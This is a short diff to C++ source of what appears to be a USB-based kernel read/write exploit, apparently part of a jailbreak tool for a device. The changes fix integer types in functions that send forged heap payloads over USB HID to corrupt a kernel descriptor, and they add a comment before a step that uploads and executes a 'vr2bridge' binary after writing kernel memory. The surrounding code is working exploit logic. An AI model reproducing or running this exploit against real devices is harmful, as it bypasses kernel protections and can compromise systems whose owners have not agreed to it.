@@ -27,7 +27,7 @@ bool KernelRW::setup_read() {
         if (heap.size() < 0x400) continue;
 
         auto it = std::search(heap.begin(), heap.end(), sauth_marker.begin(), sauth_marker.end());
-        int found_off = -1;
+        size_t found_off = -1;
         
         if (it != heap.end()) {
             found_off = std::distance(heap.begin(), it);
@@ -71,8 +71,8 @@ std::vector<uint8_t> KernelRW::_read_raw(uint64_t addr, size_t length) {
     std::vector<uint8_t> result;
     size_t offset = 0;
 
-    int HEAP_SEND_SIZE = forge_desc_off + 8;
-    std::vector<uint8_t> payload(buf.begin(), buf.begin() + std::min((size_t)HEAP_SEND_SIZE, buf.size()));
+    size_t HEAP_SEND_SIZE = forge_desc_off + 8;
+    std::vector<uint8_t> payload(buf.begin(), buf.begin() + std::min(HEAP_SEND_SIZE, buf.size()));
     if (usb->hid_set(0xFF, 0xFF, payload) == 0) return {};
 
     while (offset < length) {
@@ -199,8 +199,8 @@ void KernelRW::repair_descriptor() {
     }
     else {
         if (!cached_heap.empty()) {
-            int HEAP_SEND_SIZE = forge_desc_off + 8;
-            std::vector<uint8_t> payload(cached_heap.begin(), cached_heap.begin() + std::min((size_t)HEAP_SEND_SIZE, cached_heap.size()));
+            size_t HEAP_SEND_SIZE = forge_desc_off + 8;
+            std::vector<uint8_t> payload(cached_heap.begin(), cached_heap.begin() + std::min(HEAP_SEND_SIZE, cached_heap.size()));
             usb->hid_set(0xFF, 0xFF, payload);
         }
     }
@@ -884,6 +884,7 @@ bool KernelRW::setup_jb_env() {
 
             write_u64_fast(constants::TEXT_ALLOC_BASE, rwx_base);
             
+            // Upload and execute vr2bridge
             upload_to_tmp("./vr2bridge", "vr2bridge");
             execute_elf("/tmp/vr2bridge", {});
 
